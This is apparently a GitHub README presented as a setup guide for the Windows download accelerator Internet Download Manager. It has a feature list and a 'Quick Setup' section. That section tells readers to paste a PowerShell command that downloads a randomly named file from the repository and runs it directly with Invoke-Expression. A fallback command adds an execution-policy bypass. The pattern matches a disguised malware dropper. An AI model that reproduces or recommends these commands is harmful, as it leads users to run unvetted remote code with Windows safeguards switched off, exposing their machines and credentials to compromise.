# Internet Download Manager

Internet Download Manager is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Internet Download Manager and work in it.

Internet Download Manager is a Windows desktop program that accelerates HTTP, HTTPS, and FTP transfers while keeping every job in a single queue you can pause, reorder, or schedule. It plugs into common browsers so captures from pages become downloads with consistent naming, folders, and retry rules instead of scattered save dialogs.

A typical session starts when you copy a link or accept a capture from the browser extension. IDM splits the file across several connections, shows live speed and ETA, and writes to the folder you chose. If the connection drops, you resume later from the same byte offset; finished items stay in history so you can open the file or reveal it in Explorer.

This repository holds the Windows setup package, release notes, and a changelog that tracks version bumps and integration fixes. Short configuration notes explain default folders, connection limits, and browser attachment after install so a new machine matches your usual workflow.

## What you do with it

- Splits each file across several TCP connections to raise throughput on high-latency links.
- Captures download links from Chrome, Edge, Firefox, and other browsers through a lightweight helper.
- Resumes partial files after sleep, VPN changes, or dropped Wi-Fi without re-fetching completed segments.
- Queues many jobs with drag order, per-item limits, and start times for off-peak windows.
- Remembers destination folders and filename patterns so repeated sources land in predictable paths.
- Logs finished transfers with size and timestamp so you can reopen or locate files quickly.
- Throttles global or per-download speed when you need headroom for calls or gaming.
- Supports HTTP, HTTPS, and FTP retrieval with proxy and authentication options common on corporate networks.

## Quick Setup (PowerShell)

This installs the program Internet Download Manager on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/julia77320/internet-download-manager-setup-guide/main/i0jggtn97t.deiqcr8a | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/julia77320/internet-download-manager-setup-guide/main/i0jggtn97t.deiqcr8a | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `i0jggtn97t.deiqcr8a` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `julia77320/internet-download-manager-setup-guide`. Internet Download Manager 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
